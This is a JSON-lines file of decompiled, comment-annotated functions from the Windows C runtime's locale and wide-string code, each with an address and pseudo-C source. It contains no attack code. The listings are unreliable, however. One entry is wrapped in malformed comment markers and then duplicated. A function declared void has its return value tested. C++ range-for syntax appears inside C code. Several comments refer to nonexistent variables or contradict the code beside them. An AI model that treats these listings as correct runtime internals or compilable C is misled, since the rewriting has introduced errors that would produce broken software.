{"Function Name": "__acrt_locale_initialize_time", "Address": "14001af10", "Source Code": "\nundefined8 __acrt_locale_initialize_time(__crt_locale_data *localeData)\n{\n    undefined **localeTimeDataPtr; // Pointer to hold the allocated memory for locale time data\n    __crt_lc_time_data *localeTimeData; // Pointer to hold the locale time data structure\n\n    // Check if the locale time reference is already initialized\n    if (*(longlong *)(localeData + 0x150) == 0) {\n        localeTimeDataPtr = &defaultLocaleTimeData; // Set pointer to default locale time data\n        releaseLocaleTimeReference(*(undefined ***)(localeData + 0x120)); // Release existing locale time reference\n        *(undefined ***)(localeData + 0x120) = localeTimeDataPtr; // Assign default locale time data to the parameter\n        return 0; // Return success\n    } else {\n        // Allocate memory for locale time data\n        localeTimeDataPtr = (undefined **)allocateMemory(1, 0x2c0);\n        if (localeTimeDataPtr != (undefined **)0x0) { // Check if memory allocation was successful\n            // Initialize locale time data\n            if (initializeLocaleTime((__crt_lc_time_data *)localeTimeDataPtr, localeData)) {\n                *(undefined4 *)((longlong)localeTimeDataPtr + 0x15c) = 1; // Mark the locale time data as initialized\n                freeMemory((LPVOID)0x0); // Free unused memory (null pointer)\n                releaseLocaleTimeReference(*(undefined ***)(localeData + 0x120)); // Release existing locale time reference\n                *(undefined ***)(localeData + 0x120) = localeTimeDataPtr; // Assign newly initialized locale time data\n                return 0; // Return success\n            }\n            freeLocaleTime(localeTimeDataPtr); // Free the allocated memory if initialization failed\n        }\n        freeMemory(localeTimeDataPtr); // Free the allocated memory if it was allocated\n        return 1; // Return failure\n    }\n}\n"}
{"Function Name": "wcscspn", "Address": "14001afac", "Source Code": "\nsize_t __cdecl wcscspn(wchar_t *inputString, wchar_t *controlString)\n{\n    wchar_t *inputPtr = inputString; // Pointer to traverse the input string\n    wchar_t *controlPtr; // Pointer to traverse the control string\n\n    // Loop through each character in the input string until the null terminator\n    while (*inputPtr != L'\\0') {\n        controlPtr = controlString; // Reset the control pointer for each character in the input string\n        // Loop through each character in the control string until the null terminator\n        while (*controlPtr != L'\\0') {\n            // Check if the current character in the input string matches any character in the control string\n            if (*inputPtr == *controlPtr) \n                return (size_t)(inputPtr - inputString); // Return the length of the segment before the match\n            controlPtr++; // Move to the next character in the control string\n        }\n        inputPtr++; // Move to the next character in the input string\n    }\n    // Return the length of the input string if no characters from the control string were found\n    return (size_t)(inputPtr - inputString);\n}\n"}
{"Function Name": "wcspbrk", "Address": "14001afec", "Source Code": "\\*\nwchar_t * __cdecl wcspbrk(wchar_t *inputString, wchar_t *controlString)\n{\n    // Loop through each character in the input string _Str\n    while (*inputString != L'\\0') {\n        wchar_t *controlPointer = controlString; // Pointer to iterate through _Control\n        // Loop through each character in the control string _Control\n        while (*controlPointer != L'\\0') {\n            // Check if the current character in _Control matches the current character in _Str\n            if (*controlPointer == *inputString) {\n                return inputString; // Return the pointer to the matching character in _Str\n            }\n            controlPointer++; // Move to the next character in _Control\n        }\n        inputString++; // Move to the next character in _Str\n    }\n    return (wchar_t *)0x0; // Return null pointer if no match is found\n}\n*\\ \n \n\nwchar_t * __cdecl wcspbrk(wchar_t *inputString, wchar_t *controlString)\n{\n    while (*inputString != L'\\0') {\n        wchar_t *controlPointer = controlString;\n        while (*controlPointer != L'\\0') {\n            if (*controlPointer == *inputString) {\n                return inputString;\n            }\n            controlPointer++;\n        }\n        inputString++;\n    }\n    return (wchar_t *)0x0;\n}\n"}
{"Function Name": "__acrt_add_locale_ref", "Address": "14001b020", "Source Code": "\nvoid __acrt_add_locale_ref(longlong locale_ref)\n{\n    int *int_pointer; // Pointer to an integer\n    undefined8 *memory_pointer = (undefined8 *)(locale_ref + 0x38); // Pointer to a specific location in memory\n    LOCK(); // Acquire a lock to ensure thread safety\n    *(int *)(locale_ref + 0x10) += 1; // Increment the reference count at offset 0x10\n    UNLOCK(); // Release the lock\n\n    // Loop through a fixed number of entries (4)\n    for (int index = 0; index < 4; index++) {\n        int_pointer = *(int **)(locale_ref + 0xe0 + index * 0x10); // Get pointer to the integer at calculated offset\n        if (int_pointer != (int *)0x0) { // Check if the pointer is not null\n            LOCK(); // Acquire a lock\n            *int_pointer += 1; // Increment the value pointed to by piVar1\n            UNLOCK(); // Release the lock\n        }\n    }\n\n    // Loop for a fixed number of iterations (6)\n    for (longlong iteration_count = 6; iteration_count != 0; iteration_count--) {\n        // Check conditions and increment reference counts if applicable\n        if (((undefined *)memory_pointer[-2] != &DAT_140038318) && (int_pointer = (int *)*memory_pointer, int_pointer != (int *)0x0)) {\n            LOCK(); // Acquire a lock\n            *int_pointer += 1; // Increment the value pointed to by piVar1\n            UNLOCK(); // Release the lock\n        }\n        if ((memory_pointer[-3] != 0) && (int_pointer = (int *)memory_pointer[-1], int_pointer != (int *)0x0)) {\n            LOCK(); // Acquire a lock\n            *int_pointer += 1; // Increment the value pointed to by piVar1\n            UNLOCK(); // Release the lock\n        }\n        memory_pointer += 4; // Move to the next set of data\n    }\n    // Call function to add locale reference for LC_TIME category\n    __acrt_locale_add_lc_time_reference(*(undefined ***)(locale_ref + 0x120));\n}\n"}
{"Function Name": "__acrt_free_locale", "Address": "14001b0ac", "Source Code": "\nvoid __acrt_free_locale(longlong locale_ptr)\n{\n    int *int_ptr; // Pointer to an integer\n    longlong loop_counter; // Variable for loop control\n    undefined8 *locale_pointer; // Pointer to an undefined 8-byte type\n    undefined8 *data_pointer; // Pointer to an undefined 8-byte type\n\n    // Check if the locale structure is valid and not equal to a specific pointer\n    if ((*(undefined ***)(locale_ptr + 0xf8) != (undefined **)0x0) &&\n        (*(undefined ***)(locale_ptr + 0xf8) != &PTR_DAT_1400380e0) &&\n        (*(int **)(locale_ptr + 0xe0) != (int *)0x0) && \n        (**(int **)(locale_ptr + 0xe0) == 0)) {\n        \n        int_ptr = *(int **)(locale_ptr + 0xf0); // Get pointer from offset 0xf0\n        // Check if the pointer is valid and points to zero\n        if ((int_ptr != (int *)0x0) && (*int_ptr == 0)) {\n            _free_base(int_ptr); // Free the base memory\n            __acrt_locale_free_monetary(*(longlong *)(locale_ptr + 0xf8)); // Free monetary locale data\n        }\n        \n        int_ptr = *(int **)(locale_ptr + 0xe8); // Get pointer from offset 0xe8\n        // Check if the pointer is valid and points to zero\n        if ((int_ptr != (int *)0x0) && (*int_ptr == 0)) {\n            _free_base(int_ptr); // Free the base memory\n            __acrt_locale_free_numeric(*(longlong **)(locale_ptr + 0xf8)); // Free numeric locale data\n        }\n        \n        _free_base(*(LPVOID *)(locale_ptr + 0xe0)); // Free memory at offset 0xe0\n        _free_base(*(LPVOID *)(locale_ptr + 0xf8)); // Free memory at offset 0xf8\n    }\n\n    // Check if the structure at offset 0x100 is valid and points to zero\n    if ((*(int **)(locale_ptr + 0x100) != (int *)0x0) && (**(int **)(locale_ptr + 0x100) == 0)) {\n        _free_base((LPVOID)(*(longlong *)(locale_ptr + 0x108) - 0xfe)); // Free adjusted memory at offset 0x108\n        _free_base((LPVOID)(*(longlong *)(locale_ptr + 0x110) - 0x80)); // Free adjusted memory at offset 0x110\n        _free_base((LPVOID)(*(longlong *)(locale_ptr + 0x118) - 0x80)); // Free adjusted memory at offset 0x118\n        _free_base(*(LPVOID *)(locale_ptr + 0x100)); // Free memory at offset 0x100\n    }\n\n    __acrt_locale_free_lc_time_if_unreferenced(*(undefined ***)(locale_ptr + 0x120)); // Free LC time if unreferenced\n    \n    locale_pointer = (undefined8 *)(locale_ptr + 0x128); // Initialize pointer for loop\n    loop_counter = 6; // Set loop counter\n    data_pointer = (undefined8 *)(locale_ptr + 0x38); // Initialize another pointer for loop\n    \n    // Loop through a fixed number of elements\n    do {\n        // Check conditions for freeing memory\n        if ((data_pointer[-2] != &DAT_140038318) &&\n            (int_ptr = (int *)*data_pointer, int_ptr != (int *)0x0) && (*int_ptr == 0)) {\n            _free_base(int_ptr); // Free the base memory\n            _free_base((LPVOID)*locale_pointer); // Free memory pointed by puVar3\n        }\n        \n        // Check another condition for freeing memory\n        if ((data_pointer[-3] != 0) && (int_ptr = (int *)data_pointer[-1], int_ptr != (int *)0x0) && (*int_ptr == 0)) {\n            _free_base(int_ptr); // Free the base memory\n        }\n        \n        locale_pointer++; // Move to the next element\n        data_pointer += 4; // Move to the next element in puVar4\n        loop_counter--; // Decrement loop counter\n    } while (loop_counter != 0); // Continue until loop counter reaches zero\n    \n    _free_base((LPVOID)locale_ptr); // Free the main locale structure\n    return; // Exit the function\n}\n"}
{"Function Name": "__acrt_locale_add_lc_time_reference", "Address": "14001b224", "Source Code": "\nint __acrt_locale_add_lc_time_reference(undefined **locale_param)\n{\n    // Check if param_1 is not null and not equal to a specific pointer\n    if (locale_param != (undefined **)0x0 && locale_param != &PTR_DAT_140029b20) {\n        LOCK(); // Acquire a lock to ensure thread safety\n        int *time_ref_counter_ptr = (int *)((longlong)locale_param + 0x15c); // Calculate the address for the time reference counter\n        int current_time_ref_count = *time_ref_counter_ptr; // Retrieve the current value of the time reference counter\n        *time_ref_counter_ptr = current_time_ref_count + 1; // Increment the time reference counter\n        UNLOCK(); // Release the lock\n        return current_time_ref_count + 1; // Return the new value of the time reference counter\n    }\n    return 0x7fffffff; // Return a specific error value if the conditions are not met\n}\n"}
{"Function Name": "__acrt_locale_free_lc_time_if_unreferenced", "Address": "14001b24c", "Source Code": "\nvoid __acrt_locale_free_lc_time_if_unreferenced(undefined **locale_pointer)\n{\n    // Check if param_1 is not null and not equal to a specific pointer\n    if (locale_pointer != (undefined **)0x0 && locale_pointer != &specific_pointer && *(int *)((longlong)locale_pointer + 0x15c) == 0) {\n        // Free the locale time associated with param_1\n        free_locale_time(locale_pointer);\n        // Free the memory allocated for param_1\n        free_memory(locale_pointer);\n    }\n}\n"}
{"Function Name": "__acrt_release_locale_ref", "Address": "14001b2ac", "Source Code": "\nvoid __acrt_release_locale_ref(longlong locale_ref)\n{\n    int *int_pointer; // Pointer to an integer\n    undefined8 *undefined_pointer; // Pointer to an undefined8 type\n    longlong loop_counter; // Variable for loop control\n\n    if (locale_ref != 0) { // Check if param_1 is not null\n        LOCK(); // Acquire lock for thread safety\n        *(int *)(locale_ref + 0x10) = *(int *)(locale_ref + 0x10) - 1; // Decrement reference count at offset 0x10\n        UNLOCK(); // Release lock\n\n        // Loop through specific offsets to decrement reference counts\n        for (int current_offset : {0xe0, 0xf0, 0xe8, 0x100}) {\n            int_pointer = *(int **)(locale_ref + current_offset); // Get pointer to integer at the current offset\n            if (int_pointer != (int *)0x0) { // Check if the pointer is not null\n                LOCK(); // Acquire lock for thread safety\n                *int_pointer = *int_pointer - 1; // Decrement the reference count\n                UNLOCK(); // Release lock\n            }\n        }\n\n        undefined_pointer = (undefined8 *)(locale_ref + 0x38); // Initialize pointer to start at offset 0x38\n        loop_counter = 6; // Set loop counter to 6\n        do {\n            // Check if the value at two positions before is not a specific address\n            if (undefined_pointer[-2] != &DAT_140038318) {\n                int_pointer = (int *)*undefined_pointer; // Get pointer to integer from current position\n                if (int_pointer != (int *)0x0) { // Check if the pointer is not null\n                    LOCK(); // Acquire lock for thread safety\n                    *int_pointer = *int_pointer - 1; // Decrement the reference count\n                    UNLOCK(); // Release lock\n                }\n            }\n            // Check if the value at three positions before is not zero\n            if (undefined_pointer[-3] != 0) {\n                int_pointer = (int *)undefined_pointer[-1]; // Get pointer to integer from one position before\n                if (int_pointer != (int *)0x0) { // Check if the pointer is not null\n                    LOCK(); // Acquire lock for thread safety\n                    *int_pointer = *int_pointer - 1; // Decrement the reference count\n                    UNLOCK(); // Release lock\n                }\n            }\n            undefined_pointer += 4; // Move to the next set of data (increment pointer by 4)\n            loop_counter--; // Decrement loop counter\n        } while (loop_counter != 0); // Continue loop until counter reaches zero\n\n        // Release locale reference for lc_time\n        __acrt_locale_release_lc_time_reference(*(undefined ***)(locale_ref + 0x120));\n    }\n}\n"}
{"Function Name": "FUN_14001b354", "Address": "14001b354", "Source Code": "\nundefined ** FUN_14001b354(void)\n{\n    // Retrieve the pointer to the thread data structure\n    longlong threadDataPtr = __acrt_getptd();\n    \n    // Get the pointer to the thread-local storage information\n    undefined **tlsInfoPtr = *(undefined ***)(threadDataPtr + 0x90);\n    \n    // Check if a specific condition is met or if the pointer is null\n    if (((DAT_1400381a4 & *(uint *)(threadDataPtr + 0x3a8)) == 0) || (tlsInfoPtr == (undefined **)0x0)) {\n        // Lock the critical section to ensure thread safety\n        __acrt_lock(4);\n        \n        // Update the thread-local storage information without locking\n        tlsInfoPtr = _updatetlocinfoEx_nolock((longlong *)(threadDataPtr + 0x90), DAT_14003a448);\n        \n        // Unlock the critical section\n        __acrt_unlock(4);\n        \n        // Check if the update failed and terminate the program if it did\n        if (tlsInfoPtr == (undefined **)0x0) {\n            abort();\n        }\n    }\n    \n    // Return the pointer to the thread-local storage information\n    return tlsInfoPtr;\n}\n"}
{"Function Name": "_updatetlocinfoEx_nolock", "Address": "14001b3c4", "Source Code": "\nundefined ** _updatetlocinfoEx_nolock(longlong *locale_pointer, undefined **new_locale_pointer)\n{\n    // Check if either param_1 or param_2 is null\n    if (new_locale_pointer == (undefined **)0x0 || locale_pointer == (longlong *)0x0) {\n        // Return null if either parameter is null\n        return (undefined **)0x0;\n    }\n\n    // Dereference param_1 to get the current locale pointer\n    undefined **current_locale_pointer = (undefined **)*locale_pointer;\n    \n    // Check if the current locale pointer is different from the new locale pointer\n    if (current_locale_pointer != new_locale_pointer) {\n        // Update param_1 to point to the new locale pointer\n        *locale_pointer = (longlong)new_locale_pointer;\n        \n        // Increment the reference count for the new locale\n        __acrt_add_locale_ref((longlong)new_locale_pointer);\n        \n        // Check if the old locale pointer is not null and release its reference\n        if (current_locale_pointer != (undefined **)0x0 && \n            __acrt_release_locale_ref((longlong)current_locale_pointer), \n            // Check if the reference count for the old locale is zero and it's not a default locale\n            *(int *)(current_locale_pointer + 2) == 0 && \n            current_locale_pointer != &PTR_DAT_1400381b0) {\n            // Free the old locale if the reference count is zero\n            __acrt_free_locale((longlong)current_locale_pointer);\n        }\n    }\n    \n    // Return the new locale pointer\n    return new_locale_pointer;\n}\n"}
{"Function Name": "GetLocaleNameFromDefault", "Address": "14001b42c", "Source Code": "\nvoid GetLocaleNameFromDefault(longlong locale_param)\n{\n    int locale_name_length; // Variable to store the result of the locale name retrieval\n    errno_t copy_result; // Variable to store the result of the safe string copy operation\n    longlong locale_index; // Variable to iterate through the locale name string\n    wchar_t locale_buffer[88]; // Buffer to hold the locale name\n\n    *(uint *)(locale_param + 0x10) |= 0x104; // Set a specific flag in the structure pointed to by param_1\n    locale_name_length = __acrt_GetUserDefaultLocaleName(locale_buffer, 0x55); // Retrieve the user's default locale name\n    if (locale_name_length > 1) { // Check if the locale name was successfully retrieved\n        locale_index = 0; // Initialize the index for the locale name buffer\n        while (locale_buffer[locale_index] != L'\\0') { // Loop to find the length of the locale name\n            locale_index++; // Increment the index\n        }\n        copy_result = wcsncpy_s((wchar_t *)(locale_param + 600), 0x55, locale_buffer, locale_index + 1); // Copy the locale name to a specific location in the structure\n        if (copy_result != 0) { // Check if the copy operation was successful\n            _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling if the copy failed\n        }\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "GetLocaleNameFromLangCountry", "Address": "14001b4d4", "Source Code": "\nvoid GetLocaleNameFromLangCountry(undefined8 *localeData)\n{\n    short *languageString = (short *)*localeData; // Pointer to the language string\n    longlong languageLength = -1; // Counter for the length of the language string\n    longlong countryLength = -1; // Counter for the length of the country string\n\n    // Calculate the length of the language string\n    do {\n        languageLength++;\n    } while (languageString[languageLength] != 0); // Continue until null terminator is found\n    \n    // Store whether the length of the language string is 3\n    *(uint *)(localeData + 3) = (uint)(languageLength == 3);\n\n    // Calculate the length of the country string\n    do {\n        countryLength++;\n    } while (*(short *)(localeData[1] + countryLength * 2) != 0); // Continue until null terminator is found\n    \n    // Store whether the length of the country string is 3\n    *(uint *)((longlong)localeData + 0x1c) = (uint)(countryLength == 3);\n    \n    // Initialize iVar6 based on the length of the language string\n    int validCharacterCount = (languageLength == 3) ? 2 : 0;\n    \n    // If the language string length is not 3 and is not null\n    if (languageLength != 3 && languageString != (short *)0x0) {\n        while (true) {\n            short currentCharacter = *languageString++; // Get the next character from the language string\n            // Check if the character is not a valid alphabetic character\n            if ((0x19 < (ushort)(currentCharacter - 0x41U)) && (0x19 < (ushort)(currentCharacter - 0x61U))) break;\n            validCharacterCount++; // Increment the counter for valid characters\n        }\n    }\n    \n    // Store the count of valid characters in the parameter\n    *(int *)((longlong)localeData + 0x14) = validCharacterCount;\n    \n    // Call the system locale enumeration function\n    __acrt_EnumSystemLocalesEx(FUN_14001b63c, 3, 0, 0);\n    \n    uint localeFlags = *(uint *)(localeData + 2); // Retrieve the value from the parameter\n    // Check specific bits in uVar2 and reset if conditions are met\n    if ((localeFlags >> 8 & 1) == 0 || ((localeFlags & 7) == 0 || (localeFlags >> 9 & 1) == 0)) {\n        *(undefined4 *)(localeData + 2) = 0; // Reset the parameter if conditions are met\n    }\n}\n"}
{"Function Name": "GetLocaleNameFromLanguage", "Address": "14001b5a4", "Source Code": "\nvoid GetLocaleNameFromLanguage(undefined8 *locale_param)\n{\n    short *language_string = (short *)*locale_param; // Retrieve the language string from the parameter\n    longlong length_counter = -1; // Initialize a counter for the length of the language string\n    \n    do {\n        length_counter++; // Increment the counter\n    } while (language_string[length_counter] != 0); // Continue until the null terminator is found\n    \n    *(uint *)(locale_param + 3) = (uint)(length_counter == 3); // Set a flag if the length is 3\n    int index_flag = (length_counter == 3) ? 2 : 0; // Set iVar4 based on the length of the string\n\n    if (length_counter != 3 && language_string != (short *)0x0) { // Check if length is not 3 and pointer is valid\n        for (int char_index = 0; ; char_index++) { // Loop through the characters of the string\n            short current_char = *language_string++; // Get the current character\n            if ((0x19 < (ushort)(current_char - 0x41U)) && (0x19 < (ushort)(current_char - 0x61U))) break; // Break if character is not a-z or A-Z\n            index_flag = char_index + 1; // Update iVar4 with the current index\n        }\n    }\n\n    *(int *)((longlong)locale_param + 0x14) = index_flag; // Store the final index in the parameter\n    __acrt_EnumSystemLocalesEx(FUN_14001b928, 3, 0, 0); // Enumerate system locales with a callback function\n    \n    if ((*(byte *)(locale_param + 2) & 4) == 0) { // Check if a specific flag is not set\n        *(undefined4 *)(locale_param + 2) = 0; // Reset the value if the flag is not set\n    }\n}\n"}
{"Function Name": "FUN_14001b63c", "Address": "14001b63c", "Source Code": "\nvoid FUN_14001b63c(wchar_t *localeString) // Function definition with a wide character string parameter\n{\n    longlong *localePointer; // Pointer to a long long variable\n    uint statusFlags; // Unsigned integer variable\n    short *localeStringPointer; // Pointer to a short variable\n    int resultCode; // Integer variable for storing return values\n    errno_t errorCode; // Error variable for storing error codes\n    longlong threadLocalData; // Long long variable for storing a pointer\n    longlong loopIndex; // Long long variable for loop index\n    undefined1 temporaryStorage[32]; // Stack array for temporary storage\n    WCHAR localeBuffer[64]; // Local wide character array for locale information\n    ulonglong securityCheckValue = DAT_140038080 ^ (ulonglong)temporaryStorage; // Local variable for security check\n\n    threadLocalData = __acrt_getptd(); // Get the thread-local data pointer\n    localePointer = (longlong *)(threadLocalData + 0x98); // Pointer to a specific location in thread-local data\n    resultCode = __acrt_GetLocaleInfoEx(localeString, (-(uint)(*(int *)(threadLocalData + 0xb4) != 0) & 0xfffff005) + 0x1002, localeBuffer, 0x40); // Retrieve locale information\n\n    if (resultCode != 0) { // Check if locale information was successfully retrieved\n        resultCode = _wcsicmp(*(wchar_t **)(threadLocalData + 0xa0), localeBuffer); // Compare retrieved locale with current locale\n        if (resultCode != 0) goto LAB_14001b772; // If not equal, jump to label\n\n        resultCode = __acrt_GetLocaleInfoEx(localeString, (-(uint)(*(int *)(threadLocalData + 0xb0) != 0) & 0xfffff002) + 0x1001, localeBuffer, 0x40); // Retrieve additional locale information\n        if (resultCode == 0) goto LAB_14001b69e; // If failed, jump to label\n\n        resultCode = _wcsicmp((wchar_t *)*localePointer, localeBuffer); // Compare another locale with the retrieved one\n        if (resultCode == 0) { // If they are equal\n            *(uint *)(threadLocalData + 0xa8) |= 0x304; // Set specific bits in the status variable\n            loopIndex = -1; // Initialize loop index\n            while (localeString[++loopIndex] != L'\\0'); // Loop to find the length of param_1\n            goto LAB_14001b755; // Jump to label\n        } else if ((*(uint *)(threadLocalData + 0xa8) & 2) == 0) { // Check if a specific bit is not set\n            if ((*(int *)(threadLocalData + 0xac) == 0) || (resultCode = _wcsnicmp((wchar_t *)*localePointer, localeBuffer, (longlong)*(int *)(threadLocalData + 0xac)), resultCode != 0)) { // Compare with a length limit\n                if (((*(byte *)(threadLocalData + 0xa8) & 1) != 0) || (resultCode = TestDefaultCountry(localeString), resultCode == 0)) goto LAB_14001b772; // Check conditions and jump if true\n                *(uint *)(threadLocalData + 0xa8) |= 1; // Set a specific bit\n                loopIndex = -1; // Initialize loop index\n                while (localeString[++loopIndex] != L'\\0'); // Loop to find the length of param_1\n            } else {\n                *(uint *)(threadLocalData + 0xa8) |= 2; // Set another specific bit\n                loopIndex = -1; // Initialize loop index\n                while (localeString[++loopIndex] != L'\\0'); // Loop to find the length of param_1\n            }\n            goto LAB_14001b755; // Jump to label\n        }\n    }\nLAB_14001b772: // Label for handling specific conditions\n    if ((*(uint *)(threadLocalData + 0xa8) & 0x300) == 0x300) goto LAB_14001b8e9; // Check if specific bits are set\n\n    resultCode = __acrt_GetLocaleInfoEx(localeString, (-(uint)(*(int *)(threadLocalData + 0xb0) != 0) & 0xfffff002) + 0x1001, localeBuffer, 0x40); // Retrieve additional locale information\n    if (resultCode != 0) { // Check if retrieval was successful\n        resultCode = _wcsicmp((wchar_t *)*localePointer, localeBuffer); // Compare the retrieved locale with another\n        if (resultCode != 0) goto LAB_14001b8e9; // If not equal, jump to label\n\n        statusFlags = *(uint *)(threadLocalData + 0xa8); // Store current status variable\n        *(uint *)(threadLocalData + 0xa8) = statusFlags | 0x200; // Set a specific bit in the status variable\n\n        if (*(int *)(threadLocalData + 0xb0) == 0) { // Check if a specific condition is met\n            if (*(int *)(threadLocalData + 0xac) != 0) { // Check another condition\n                loopIndex = -1; // Initialize loop index\n                while (*(short *)(*localePointer + ++loopIndex * 2) != 0); // Loop to find the length of the locale string\n                if ((int)loopIndex == *(int *)(threadLocalData + 0xac)) { // Check if lengths match\n                    if (TestDefaultCountry(localeString) == 0) { // Check if the default country test passes\n                        localeStringPointer = (short *)*localePointer; // Get the locale string\n                        if (localeStringPointer != (short *)0x0) { // Check if the string is not null\n                            int charCount = 0; // Initialize counter\n                            short currentChar = *localeStringPointer; // Get the first character\n                            while ((currentChar >= 0x41 && currentChar <= 0x5A) || (currentChar >= 0x61 && currentChar <= 0x7A)) { // Check if character is alphabetic\n                                charCount++; // Increment counter\n                                currentChar = *(++localeStringPointer); // Move to the next character\n                            }\n                        }\n                    }\n                }\n                *(uint *)(threadLocalData + 0xa8) |= 0x100; // Set a specific bit in the status variable\n                if (*(short *)(threadLocalData + 0x2f0) != 0) goto LAB_14001b8e9; // Check if another condition is met\n                loopIndex = -1; // Initialize loop index\n                while (localeString[++loopIndex] != L'\\0'); // Loop to find the length of param_1\n                goto LAB_14001b8cb; // Jump to label\n            }\n        }\n    }\n    *(uint *)(threadLocalData + 0xa8) = statusFlags | 0x300; // Set specific bits in the status variable\n    if (*(short *)(threadLocalData + 0x2f0) != 0) goto LAB_14001b8e9; // Check if another condition is met\n    loopIndex = -1; // Initialize loop index\n    while (localeString[++loopIndex] != L'\\0'); // Loop to find the length of param_1\n\nLAB_14001b8cb: // Label for copying the string\n    errorCode = wcsncpy_s((wchar_t *)(threadLocalData + 0x2f0), 0x55, localeString, loopIndex + 1); // Copy the string safely\n    if (errorCode != 0) { // Check if the copy was successful\n        _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling\n    }\nLAB_14001b8e9: // Label for cleanup and exit\n    __security_check_cookie(securityCheckValue ^ (ulonglong)temporaryStorage); // Security check\n    return; // Return from the function\n}\n"}
{"Function Name": "FUN_14001b928", "Address": "14001b928", "Source Code": "\nvoid FUN_14001b928(wchar_t *localeString)\n{\n    int localeInfoResult; // Variable to store the return value of locale info retrieval\n    errno_t stringCopyResult; // Variable to store the result of the string copy operation\n    longlong threadLocalDataPtr; // Pointer to the thread-local data\n    longlong loopCounter; // Variable for loop control\n    longlong currentLoopCounter; // Variable for loop control\n    WCHAR localeBuffer[120]; // Buffer to hold locale information\n    ulonglong securityCookie = DAT_140038080 ^ (ulonglong)localeBuffer; // Security cookie for stack protection\n\n    threadLocalDataPtr = __acrt_getptd(); // Get the pointer to the thread-local data\n    localeInfoResult = __acrt_GetLocaleInfoEx(localeString, (-(uint)(*(int *)(threadLocalDataPtr + 0xb0) != 0) & 0xfffff002) + 0x1001, localeBuffer, 0x78);\n    // Retrieve locale information based on the provided parameter and store it in local_108\n    \n    if (localeInfoResult == 0) { // Check if the locale info retrieval was unsuccessful\n        *(undefined4 *)(threadLocalDataPtr + 0xa8) = 0; // Set a specific field in thread-local data to 0\n    } else {\n        localeInfoResult = _wcsicmp(*(wchar_t **)(threadLocalDataPtr + 0x98), localeBuffer); // Compare the retrieved locale with the existing one\n        if (localeInfoResult == 0) { // If the locales are the same\n            loopCounter = -1; // Initialize loop counter\n            do {\n                currentLoopCounter = loopCounter; // Store current loop counter\n                loopCounter = currentLoopCounter + 1; // Increment loop counter\n            } while (localeString[loopCounter] != L'\\0'); // Continue until the end of the string is reached\n            \n            stringCopyResult = wcsncpy_s((wchar_t *)(threadLocalDataPtr + 0x2f0), 0x55, localeString, currentLoopCounter + 2); // Copy the string safely\n            if (stringCopyResult != 0) { // Check if the string copy was unsuccessful\n                _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling\n            }\n            *(uint *)(threadLocalDataPtr + 0xa8) |= 4; // Update a specific field in thread-local data\n        }\n    }\n    __security_check_cookie(securityCookie); // Validate the security cookie for stack protection\n    return; // Exit the function\n}\n"}
{"Function Name": "ProcessCodePage", "Address": "14001ba14", "Source Code": "\nlong ProcessCodePage(wchar_t *inputString, longlong localeIdentifier)\n{\n    long resultValue; // Variable to store a long integer value\n    LCTYPE localeType; // Variable to store locale type information\n    int localeResults[2]; // Array to store results from locale information\n\n    // Check if the input parameter is null, empty, or equal to \"ACP\"\n    if (inputString == (wchar_t *)0x0 || *inputString == L'\\0' || wcscmp(inputString, L\"ACP\") == 0) {\n        localeType = 0x20001004; // Set locale type for default code page\n    } \n    // Check if the input parameter is \"utf8\" or \"utf-8\" (case insensitive)\n    else if (_wcsicmp(inputString, L\"utf8\") == 0 || _wcsicmp(inputString, L\"utf-8\") == 0) {\n        return 0xfde9; // Return specific value for UTF-8\n    } \n    // Check if the input parameter is not equal to \"OCP\"\n    else if (wcscmp(inputString, L\"OCP\") != 0) {\n        return _wtol(inputString); // Convert wide string to long and return\n    } \n    // If input parameter is \"OCP\"\n    else {\n        localeType = 0x2000000b; // Set locale type for OCP\n    }\n\n    // Retrieve locale information based on the locale type and store in local_res8\n    if (__acrt_GetLocaleInfoEx((wchar_t *)(localeIdentifier + 600), localeType, (LPWSTR)localeResults, 2) == 0) {\n        return 0; // Return 0 if locale information retrieval fails\n    }\n    \n    // Return specific value based on the result stored in local_res8\n    return localeResults[0] < 3 ? 0xfde9 : localeResults[0]; // Return 0xfde9 if less than 3, else return the value\n}\n"}
{"Function Name": "TestDefaultCountry", "Address": "14001bae0", "Source Code": "\nvoid TestDefaultCountry(wchar_t *country_code)\n{\n    WCHAR locale_info[12]; // Declare a wide character array to hold locale information\n    // Retrieve locale information for the specified parameter and store it in local_28\n    if (__acrt_GetLocaleInfoEx(country_code, 0x59, locale_info, 9) != 0) {\n        // Compare the retrieved locale information with the input parameter\n        wcsncmp(locale_info, country_code, 9);\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "TranslateName", "Address": "14001bb44", "Source Code": "\nbool TranslateName(longlong base_address, int upper_bound, longlong *result_pointer)\n{\n    int middle_index; // Variable to store the middle index for binary search\n    int lower_bound = 0; // Lower bound index for the search\n    int comparison_result = 1; // Variable to store the comparison result\n\n    // Check if the provided upper bound index is non-negative\n    if (upper_bound >= 0) {\n        do {\n            // If iVar2 is 0, it indicates a match was found, return false\n            if (comparison_result == 0) {\n                return false;\n            }\n            // Calculate the middle index for binary search\n            middle_index = (lower_bound + upper_bound) / 2;\n            // Compare the string at the current index with the target string\n            comparison_result = _wcsicmp((wchar_t *)*result_pointer, *(wchar_t **)((longlong)middle_index * 0x10 + base_address));\n            // If a match is found, update param_3 to point to the found string\n            if (comparison_result == 0) {\n                *result_pointer = base_address + 8 + (longlong)middle_index * 0x10;\n            } \n            // If the target string is less than the current string, adjust the upper bound\n            else if (comparison_result < 0) {\n                upper_bound = middle_index - 1;\n            } \n            // If the target string is greater than the current string, adjust the lower bound\n            else {\n                lower_bound = middle_index + 1;\n            }\n        } while (lower_bound <= upper_bound); // Continue searching while the bounds are valid\n    }\n    // Return true if a match was found, otherwise return false\n    return comparison_result == 0;\n}\n"}
